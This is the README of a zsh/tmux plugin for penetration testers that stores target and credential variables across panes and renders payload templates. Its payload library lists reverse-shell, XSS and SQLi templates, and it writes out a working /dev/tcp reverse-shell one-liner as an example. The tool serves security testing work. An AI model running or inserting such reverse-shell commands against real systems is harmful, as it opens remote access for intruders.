# ii

`ii` is a zsh plugin for tmux-scoped workflow variables and payload rendering.

It stores `JJ_` variables in the current tmux session, lets each pane load
those variables when needed, and renders payload templates from fresh tmux
session values.

```text
tmux session environment = shared source across panes
current shell environment = values directly usable in the current pane
payload renderer = always reads fresh tmux session values
```

## Requirements

- zsh
- tmux
- fzf for `ii i` and `ii p`
- coreutils for `base64`, used by OSC52 clipboard copy

Kali:

```zsh
sudo apt update
sudo apt install -y zsh tmux fzf coreutils
```

## Kali Deployment

`ii` is installed through `ii.plugin.zsh`. Put the whole project directory under
your zsh plugin directory. Do not source internal files under `lib/` directly.

### 1. Install Dependencies

```zsh
sudo apt update
sudo apt install -y zsh tmux fzf coreutils
```

### 2. Put Plugin Code In Place

Recommended antidot local plugin path:

```text
$HOME/.config/zsh/plugin/ii
```

The target `ii` directory must contain the whole plugin package:

```text
ii/
  ii.plugin.zsh
  lib/
  payloads/
  doc/
  README.md
```

From the parent directory that contains the plugin source:

```zsh
mkdir -p "$HOME/.config/zsh/plugin"
cp -r ./ii "$HOME/.config/zsh/plugin/ii"
```

### 3. Enable The Plugin

Use either an antidote/antidot-style plugin manager or manual `.zshrc` loading.

#### Option A: Antidote/antidot

If your plugin manager reads a plugin list such as `~/.zsh_plugins.txt`, add the
local plugin path:

```zsh
$HOME/.config/zsh/plugin/ii
```

Then rebuild or reload your plugin bundle using your existing antidote/antidot
setup.

#### Option B: Manual `.zshrc` Source

Add this line to `~/.zshrc`:

```zsh
source "$HOME/.config/zsh/plugin/ii/ii.plugin.zsh"
```

No extra `export JJ_PAYLOAD_DIR=...` line is needed for the bundled payloads.
The plugin sets this automatically:

```text
JJ_PLUGIN_DIR=$HOME/.config/zsh/plugin/ii
JJ_PAYLOAD_DIR=${JJ_PLUGIN_DIR}/payloads
```

Reload zsh:

```zsh
source ~/.zshrc
```

Confirm it loaded:

```zsh
type ii
echo $JJ_PAYLOAD_DIR
```

## Payload Setup

By default, the plugin points `JJ_PAYLOAD_DIR` to the bundled payload directory:

```text
${JJ_PLUGIN_DIR}/payloads
```

You do not need to export `JJ_PAYLOAD_DIR` for the bundled payloads. Override it
only if you keep payloads somewhere else:

```zsh
export JJ_PAYLOAD_DIR="$HOME/.config/ii/payloads"
```

## Clipboard Setup

For Kali over SSH, use OSC52 so `ii p` can copy rendered payloads to the local
terminal clipboard without X server or Wayland clipboard tools:

```zsh
export JJ_CLIP_BACKEND=osc52
```

Inside tmux, OSC52 also depends on your terminal and tmux clipboard/passthrough
settings. If it does not copy out, keep using the tmux buffer backend:

```zsh
export JJ_CLIP_CMD='tmux load-buffer -'
```

## Commands

| Command | Short form | Purpose |
| --- | --- | --- |
| `ii set NAME VALUE` | `ii s NAME VALUE` | Set internal `JJ_NAME` in tmux and export `NAME` in this shell |
| `ii set` | `ii s` | Open a TUI to choose common variable names and type a value |
| `ii set FILTER` | `ii s FILTER`, `ii s:FILTER` | Match variable names before setting; `ii s r` jumps to `RHOST` |
| `ii load` | `ii l` | Load tmux variables into this shell without the internal `JJ_` prefix |
| `ii interactive` | `ii i` | Select variable names with fzf, preview values, and copy selected values |
| `ii variable [PATTERN]` | `ii v [PATTERN]` | Print tmux variables without the internal `JJ_` prefix, filtered by name |
| `ii variable host` | `ii v host` | Print configured host variables as name/value lines |
| `ii variable cred` | `ii v cred` | Print configured credential variables as name/value lines |
| `ii payload [CATEGORY]` | `ii p [CATEGORY]` | Select, render, copy, and print a payload |
| `ii unset NAME [...]` | | Remove `JJ_` variables from tmux and this shell |
| `ii unset -a` | | Prompt, then remove all `JJ_` variables from the current tmux session |
| `ii help [COMMAND]` | `ii h [COMMAND]` | Show help |

## Basic Workflow

Run inside tmux:

```zsh
ii s
ii s LHOST 192.168.45.192
ii s LPORT 443
ii s DOMAIN example.test
ii s USER1 alice
ii s PASSWD1 secret

ii v
ii v host
ii v cred
ii p linux
```

`JJ_` is only an internal tmux namespace. User input is normalized to uppercase,
so `user2` and `USER2` refer to the same tmux variable, `JJ_USER2`. User-facing
commands and shell exports use names without that prefix, such as `$LHOST` and
`$DOMAIN`. `ii set` and `ii load` export both uppercase and lowercase shell
names, such as `$LHOST` and `$lhost`. Default names that have not been assigned
values are not exported into the shell.

`ii p` reads tmux session variables directly. Another pane can render a payload
without running `ii l` first, even though `echo $LHOST` still needs `ii l`.
If a payload variable has not been assigned a non-empty tmux value, `ii p`
renders a lowercase shell fallback such as `$rhost` so the copied command can
still be expanded by the shell that runs it.

`ii s FILTER` resolves matches before asking for a value. No matches prints
`no matched`; one match goes straight to the value prompt; multiple matches open
a variable selection prompt.

`ii i` shows common variable names even when they do not have values yet. The
fzf list shows names only, value text appears in preview, and search is
case-insensitive. Press Enter on a variable to edit its value, Ctrl-A to add a
variable immediately, and Ctrl-Y to copy selected existing values. The last
option is `add new variable`; selecting it also opens prompts for a variable
name and value. If a name is provided without a value, the variable is stored
with an empty value. `ii i` does not load variables into the shell. Use `ii l`
to load all non-empty variables into the current shell.

Default variable names:

```text
DOMAIN
LHOST
RHOST
LPORT
RPORT
USER1
PASSWD1
HASH1
USER2
PASSWD2
HASH2
```

`ii v host` prints configured host variables as two-line pairs:

```text
LHOST
192.168.45.192
LPORT
443
```

`ii v cred` prints configured credential variables. It shows only values that are
set:

```text
USER1
alice
PASSWD1
secret
HASH1
...
```

## Payload Library

Payload files are plain text templates under `JJ_PAYLOAD_DIR`.

Example:

```text
payloads/
  shell/
    linux/
      sh-tcp
      bash-tcp
      nc-mkfifo
    windows/
      powershell-rev
  script/
    nmap-example
  xss/
    basic-alert
```

Use `${JJ_NAME}` placeholders:

```text
/bin/sh -i >/dev/tcp/${JJ_LHOST}/${JJ_LPORT} 2>&1 0>&1
```

Files under `payloads/script/` are for custom scripts. They may use `${JJ_NAME}`
placeholders, or they may use literal shell variables such as `$rhost`; when no
renderable `${JJ_*}` placeholder is present, `ii p` copies the script text as-is.
The payload selector previews the rendered text before copying.

Filter payloads by category:

```zsh
ii p
ii p shell
ii p script
ii p linux
ii p windows
ii p xss
ii p sqli
```

## Documentation

- [Architecture](doc/architecture.md): plugin entrypoint, layer boundaries, and file responsibilities
- [Testing](doc/testing.md): syntax checks, tmux smoke tests, and cross-pane tests

## Help

```zsh
ii help
ii help set
ii help load
ii help variable
ii help payload
ii help unset
```
